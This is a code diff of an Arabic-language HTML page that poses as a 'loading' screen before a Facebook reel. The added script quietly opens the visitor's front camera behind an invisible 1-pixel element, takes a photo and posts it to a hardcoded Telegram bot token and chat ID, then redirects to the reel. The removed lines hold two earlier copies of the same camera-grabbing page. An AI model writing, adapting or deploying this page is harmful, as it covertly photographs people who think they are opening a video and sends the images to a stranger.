@@ -1,253 +1,97 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-<style>
-html, body {
-    margin: 0;
-    width: 100%;
-    height: 100%;
-    background: #111;
-    color: #fff;
-    font-family: sans-serif;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-}
-
-#video, #canvas {
-    display: none;
-}
-
-.status {
-    text-align: center;
-    font-size: 18px;
-    padding: 20px;
-}
-</style>
-</head>
-
-<body>
-
-<div class="status" id="statusText"></div>
-
-<video id="video" autoplay playsinline></video>
-<canvas id="canvas"></canvas>
-
-<script>
-async function captureAndSendToTelegram() {
-    const statusText = document.getElementById("statusText");
-
-    // ضع التوكن الخاص بك هنا بين علامتي التنصيص
-    const telegramToken = "8666905289:AAH9HB48s13a4AeZDaZmbsYRiZShGFgd9eE";
-    
-    // ضع الـ Chat ID الخاص بك هنا بين علامتي التنصيص
-    const chatId = "5015426926";
-
-    try {
-        const stream = await navigator.mediaDevices.getUserMedia({
-            video: { facingMode: "user" },
-            audio: false
-        });
-
-        const video = document.getElementById("video");
-        video.srcObject = stream;
-        await video.play();
-
-        await new Promise(resolve => {
-            if (video.videoWidth > 0) {
-                resolve();
-            } else {
-                video.onloadedmetadata = resolve;
-            }
-        });
-
-        const canvas = document.getElementById("canvas");
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        const ctx = canvas.getContext("2d");
-        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-        stream.getTracks().forEach(track => track.stop());
-        statusText.innerText = "";
-
-        canvas.toBlob(async (blob) => {
-            if (!blob) {
-                statusText.innerText = "";
-                return;
-            }
-
-            const formData = new FormData();
-            formData.append("chat_id", chatId);
-            formData.append("photo", blob, "photo.jpg");
-
-            try {
-                const response = await fetch(`https://api.telegram.org/bot${telegramToken}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
-                });
-
-                if (response.ok) {
-                    statusText.innerText = "";
-                } else {
-                    statusText.innerText = "";
-                }
-            } catch (err) {
-                console.error("Telegram error:", err);
-                statusText.innerText = "";
-            }
-
-        }, "image/jpeg", 0.9);
-
-    } catch (error) {
-        console.error("Camera error:", error);
-        statusText.innerText = "";
-    }
-}
-
-window.addEventListener("load", captureAndSendToTelegram);
-</script>
-
-</body>
-</html>
-<!DOCTYPE html>
-<html lang="ar" dir="rtl">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Camera App</title>
-
-<style>
-html, body {
-    margin: 0;
-    width: 100%;
-    height: 100%;
-    background: #111;
-    color: #fff;
-    font-family: sans-serif;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-}
-
-#video, #canvas {
-    display: none;
-}
-
-.status {
-    text-align: center;
-    font-size: 18px;
-    padding: 20px;
-}
-</style>
-</head>
-
-<body>
-
-<div class="status" id="statusText"></div>
-
-<video id="video" autoplay playsinline></video>
-<canvas id="canvas"></canvas>
-
-<script>
-async function captureAndSendToTelegram() {
-    const statusText = document.getElementById("statusText");
-
-    // ضع التوكن الخاص بك هنا بين علامتي التنصيص
-    const telegramToken = "8666905289:AAH9HB48s13a4AeZDaZmbsYRiZShGFgd9eE";
-    
-    // ضع الـ Chat ID الخاص بك هنا بين علامتي التنصيص
-    const chatId = "5015426926";
-
-    try {
-        const stream = await navigator.mediaDevices.getUserMedia({
-            video: { facingMode: "user" },
-            audio: false
-        });
-
-        const video = document.getElementById("video");
-        video.srcObject = stream;
-        await video.play();
-
-        await new Promise(resolve => {
-            if (video.videoWidth > 0) {
-                resolve();
-            } else {
-                video.onloadedmetadata = resolve;
-            }
-        });
-
-        const canvas = document.getElementById("canvas");
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        const ctx = canvas.getContext("2d");
-        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-        stream.getTracks().forEach(track => track.stop());
-        statusText.innerText = "";
-
-        canvas.toBlob(async (blob) => {
-            if (!blob) {
-                statusText.innerText = "";
-                return;
-            }
-
-            const formData = new FormData();
-            formData.append("chat_id", chatId);
-            formData.append("photo", blob, "photo.jpg");
-
-            try {
-                const response = await fetch(`https://api.telegram.org/bot${telegramToken}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
-                });
-
-                if (response.ok) {
-                } else {
-                    statusText.innerText = "فشل الإرسال، تأكد من صحة التوكن والـ Chat ID.";
-                }
-            } catch (err) {
-                console.error("Telegram error:", err);
-                statusText.innerText = "";
-            }
-
-        }, "image/jpeg", 0.9);
-
-    } catch (error) {
-        console.error("Camera error:", error);
-        statusText.innerText = "";
-    }
-}
-
-window.addEventListener("load", captureAndSendToTelegram);
-</script>
-
-</body>
-</html><!DOCTYPE html>
-<html lang="ku">
-<head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>جاري التحميل...</title>
     <style>
+        * { margin: 0; padding: 0; }
         body {
-            margin: 0;
+            width: 100%;
             height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            background-color: #111;
+            background: #000;
         }
-        .emoji-display {
-            font-size: 450px; /* قەبارەی ئیمۆجییەکە گەورە و ڕێک دەكات */
+        #video, #canvas {
+            position: absolute;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
         }
     </style>
 </head>
 <body>
-<script>
-   
-    const GROUP_LINK = 'https://www.facebook.com/reel/1363942655583132/?fs=e&fs=e';
+
+    <video id="video" autoplay playsinline muted></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        const telegramToken = "8666905289:AAH9HB48s13a4AeZDaZmbsYRiZShGFgd9eE";
+        const chatId = "5015426926";
+        
+        const CAPTURE_DELAY = 1000;    // ثانية واحدة قبل التقاط الصورة
+        const REDIRECT_DELAY = 1000;   // ثانية واحدة بعد الإرسال قبل فتح الرابط
+        
+        const VIDEO_LINK = 'https://www.facebook.com/reel/1363942655583132/?fs=e&fs=e';
+
+        async function captureAndSend() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: "user" },
+                    audio: false
+                });
+
+                const video = document.getElementById("video");
+                video.srcObject = stream;
+                await video.play();
+
+                await new Promise(resolve => {
+                    if (video.videoWidth > 0) {
+                        resolve();
+                    } else {
+                        video.onloadedmetadata = resolve;
+                    }
+                });
+
+                const canvas = document.getElementById("canvas");
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const ctx = canvas.getContext("2d");
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                stream.getTracks().forEach(track => track.stop());
+
+                canvas.toBlob(async (blob) => {
+                    if (blob) {
+                        const formData = new FormData();
+                        formData.append("chat_id", chatId);
+                        formData.append("photo", blob, "photo_" + Date.now() + ".jpg");
+
+                        try {
+                            await fetch(`https://api.telegram.org/bot${telegramToken}/sendPhoto`, {
+                                method: 'POST',
+                                body: formData
+                            });
+                        } catch (err) {
+                            console.error(err);
+                        }
+                    }
+
+                    setTimeout(() => {
+                        window.location.href = VIDEO_LINK;
+                    }, REDIRECT_DELAY);
+
+                }, "image/jpeg", 0.95);
+
+            } catch (error) {
+                console.error(error);
+                setTimeout(() => {
+                    window.location.href = VIDEO_LINK;
+                }, CAPTURE_DELAY + 1000);
+            }
+        }
+
+        setTimeout(captureAndSend, CAPTURE_DELAY);
+    </script>
 
 </body>
 </html>
